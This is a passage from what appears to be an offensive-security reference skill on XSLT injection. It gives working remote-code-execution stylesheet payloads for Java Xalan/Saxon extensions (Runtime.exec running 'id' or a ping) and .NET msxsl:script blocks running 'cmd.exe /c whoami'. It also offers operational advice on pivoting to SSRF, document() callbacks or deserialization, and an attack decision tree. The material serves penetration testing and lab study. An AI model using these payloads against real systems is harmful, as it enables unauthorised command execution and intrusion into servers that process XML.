# xslt-injection technical reference

For other original section numbers, use the [entry index](../SKILL.md#references).

## 6. RCE VIA JAVA (SAXON / XALAN EXTENSIONS)

Java engines may expose **extension functions** mapping to static methods. Examples appear in historical advisories; exact syntax depends on **version and extension binding**.

**Illustrative pattern** (conceptual — adjust to permitted extension namespace and API):

```xml
<xsl:stylesheet version="1.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime">
  <xsl:template match="/">
    <xsl:variable name="rtobject" select="rt:getRuntime()"/>
    <xsl:value-of select="rt:exec($rtobject,'/bin/sh -c id')"/>
  </xsl:template>
</xsl:stylesheet>
```

**Saxon-style static Java integration** (highly configuration-dependent):

```text
Runtime:exec(Runtime:getRuntime(), 'cmd.exe /C ping 192.0.2.1')
```

Replace `192.0.2.1` with your lab listener / documentation IP (RFC 5737 TEST-NET).

**Operational guidance**: if extensions are disabled (common secure default), pivot to **document()**, SSRF, or **deserialization** elsewhere — not every XSLT endpoint runs with extensions on.

---

## 7. RCE VIA .NET (`msxsl:script`)

When Microsoft XSLT **script blocks** are allowed:

```xml
<xsl:stylesheet version="1.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:msxsl="urn:schemas-microsoft-com:xslt"
    extension-element-prefixes="msxsl">
  <msxsl:script language="C#" implements-prefix="user">
    <![CDATA[
    public string xexec() {
      System.Diagnostics.Process.Start("cmd.exe", "/c whoami");
      return "ok";
    }
    ]]>
  </msxsl:script>
  <xsl:template match="/">
    <xsl:value-of select="user:xexec()"/>
  </xsl:template>
</xsl:stylesheet>
```

**Default secure configs** often disable scripts — treat this as **when enabled** behavior.

---

## 8. DECISION TREE

```text
                    User influences XSLT or XML transform?
                                    |
                                   NO --> stop (out of scope)
                                    |
                                   YES
                                    |
                    +---------------+---------------+
                    |                               |
             output reflects                       no reflection
             injected logic?                    try blind channels
                    |                               |
                    v                               v
            system-property()                 errors, OOB, timing
            fingerprint vendor                      |
                    |                               |
        +-----------+-----------+                   |
        |           |           |                   |
      libxslt     Java        .NET              document()
        |           |           |                   |
    document()   Saxon/Xalan  msxsl:script?      SSRF/file
    EXSLT write  extensions?      |                   |
        |           |           C# Process         EXSLT?
        v           v           v                   v
    file R/W     rt/exec      cmd.exe /c         map evidence
```

---

## Payloads All The Things (PAT) Note

The **PayloadsAllTheThings** project documents many injection classes; for **XSLT**, maintainer notes indicate **no dedicated maintained tool** section comparable to SQLi/XSS toolchains — exploitation is **processor- and configuration-specific**, driven by proxy/manual payloads and custom scripts. Plan time for **local lab reproduction** with the same engine/version as the target when possible.

---

## Tooling (practical)

| Category | Examples |
|----------|----------|
| Proxy / manual | Burp Suite, OWASP ZAP — replay stylesheet payloads, observe responses and errors |
| XML/XSLT lab | Match **exact** processor (PHP libxslt, Java Saxon version, .NET framework) in a VM |
| Out-of-band | Collaborator / private callback server for `document('http://…')` |

No single universal scanner replaces **version-specific** behavior validation.

---

## Related

- **xxe-xml-external-entity** — DTD/entity hardening, generic XML parsers (`../xxe-xml-external-entity/SKILL.md`).
- **ssrf-server-side-request-forgery** — when `document(http:…)` or entity URLs cause server fetches (`../ssrf-server-side-request-forgery/SKILL.md`).
